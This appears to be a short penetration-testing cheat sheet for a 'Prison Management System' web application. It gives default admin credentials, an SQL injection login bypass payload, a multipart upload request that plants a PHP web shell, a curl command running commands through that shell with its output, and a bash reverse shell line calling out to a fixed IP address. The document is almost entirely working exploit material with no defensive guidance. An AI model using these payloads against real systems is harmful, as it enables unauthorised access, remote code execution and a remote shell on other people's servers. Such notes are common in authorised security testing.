# Prison Management System

## Default Credentials

`admin:admin123`

## SQLi Authentication Bypass

CVE-2024-33288 - Authentication bypass via SQLi on the login interface.

The `username` parameter is directly concatenated into the SQL statement without using prepared statements.

```
# Payload
admin' or '1'='1
```

## File Upload to RCE

CVE-2024-48594 - PMS version 1.0 file upload vulnerability.

```http
POST /Admin/add-admin.php HTTP/1.1
------WebKitFormBoundary
Content-Disposition: form-data; name="avatar"; filename="webshell.php"
Content-Type: image/png

<?php system($_GET['c']);?>
------WebKitFormBoundary--
```

Execute commands:

```bash
curl --path-as-is -s -k -b 'PHPSESSID=cduqalcr0v5v9b8jh9fjkb0c32' 'https://pms-instance:9443/uploadImage/Profile/webshell.php?c=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)

# Revshell payload (non URL-encoded)
?c=/usr/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.170/80 0>&1'
```
